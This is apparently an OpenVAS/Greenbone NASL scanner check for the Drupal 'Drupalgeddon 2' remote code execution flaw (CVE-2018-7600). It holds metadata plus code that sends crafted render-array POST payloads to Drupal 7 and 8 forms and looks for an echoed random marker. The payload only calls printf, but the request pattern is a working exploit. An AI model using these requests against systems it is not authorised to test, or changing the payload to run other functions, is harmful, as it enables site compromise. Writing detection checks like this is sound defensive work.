# Copyright (C) 2018 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:drupal:drupal";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108438");
  script_version("2022-08-09T10:11:17+0000");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2018-7600");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-08-09 10:11:17 +0000 (Tue, 09 Aug 2022)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-03-01 18:04:00 +0000 (Fri, 01 Mar 2019)");
  script_tag(name:"creation_date", value:"2018-04-14 13:29:22 +0200 (Sat, 14 Apr 2018)");
  script_name("Drupal Core Critical RCE Vulnerability (SA-CORE-2018-002) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_drupal_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("drupal/http/detected");

  script_xref(name:"URL", value:"https://www.drupal.org/psa-2018-001");
  script_xref(name:"URL", value:"https://www.drupal.org/sa-core-2018-002");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/7.58");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/8.3.9");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/8.4.6");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/8.5.1");
  script_xref(name:"URL", value:"https://research.checkpoint.com/uncovering-drupalgeddon-2/");

  script_tag(name:"summary", value:"Drupal is prone to a critical remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists within multiple subsystems of Drupal. This
  potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could
  result in the site being completely compromised.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code and completely compromise the site.");

  script_tag(name:"affected", value:"Drupal core versions 6.x and earlier

  Drupal core versions 8.2.x and earlier

  Drupal core versions 8.3.x to before 8.3.9

  Drupal core versions 8.4.x to before 8.4.6

  Drupal core versions 8.5.x to before 8.5.1

  Drupal core versions 7.x to before 7.58");

  script_tag(name:"solution", value:"Update to version 8.3.9, 8.4.6, 8.5.1, 7.58 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");
include("list_array_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

check = rand_str( length:16 );
# nb: URL rewriting on/off
urls = make_list( dir + "/user/register", dir + "/?q=user/register" );

foreach url( urls ) {

  url  = url + "?element_parents=account%2Fmail%2F%23value&ajax_form=1&_wrapper_format=drupal_ajax";
  data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=" + check;
  req  = http_post_put_req( port:port, url:url, data:data,
                        add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  # neNWIz2mlhti89hQ[{"command":"insert","method":"replaceWith","selector":null,"data":"16\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  if( egrep( string:res, pattern:"^" + check + "\[\{" ) ) {

    info['"HTTP POST" body'] = data;
    info['URL'] = http_report_vuln_url( port:port, url:url, url_only:TRUE );

    report  = 'By doing the following request:\n\n';
    report += text_format_table( array:info ) + '\n\n';
    report += 'it was possible to execute the "printf" command.';
    report += '\n\nResult:\n\n' + res;

    expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
    security_message( port:port, data:report, expert_info:expert_info );
    exit( 0 );
  }
}

# Drupal 7
# This needs 2 requests (see e.g. https://github.com/FireFart/CVE-2018-7600/blob/master/poc.py)
url1 = dir + "/?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=printf&name%5B%23markup%5D="+ check +
             "&name%5B%23typ";
data1 = "form_id=user_pass&_triggering_element_name=name";

req = http_post_put_req( port:port, url:url1, data:data1,
                     add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

build_id = eregmatch( pattern:'<input type="hidden" name="form_build_id" value="([^"]+)" />', string:res );
if( ! isnull( build_id[1] ) ) {
  url2 = dir + "/?q=file%2Fajax%2Fname%2F%23value%2F" + build_id[1];
  data2 = "form_build_id=" + build_id[1];
  req = http_post_put_req( port:port, url:url2, data:data2,
                       add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  # wz8rLLg_3Uie91Rg[{"command":"settings","settings":{"basePath":"...
  if( egrep( string:res, pattern:"^" + check + "\[\{" ) ) {

    info['Req 1: "HTTP POST" body'] = data1;
    info['Req 1: URL'] = http_report_vuln_url( port:port, url:url1, url_only:TRUE );
    info['Req 2: "HTTP POST" body'] = data2;
    info['Req 2: URL'] = http_report_vuln_url( port:port, url:url2, url_only:TRUE );

    report  = 'By doing the following subsequent requests:\n\n';
    report += text_format_table( array:info ) + '\n\n';
    report += 'it was possible to execute the "printf" command to return the data "' + check + '".';
    report += '\n\nResult:\n\n' + res;

    expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
    security_message( port:port, data:report, expert_info:expert_info );
    exit( 0 );
  }
}

exit( 99 );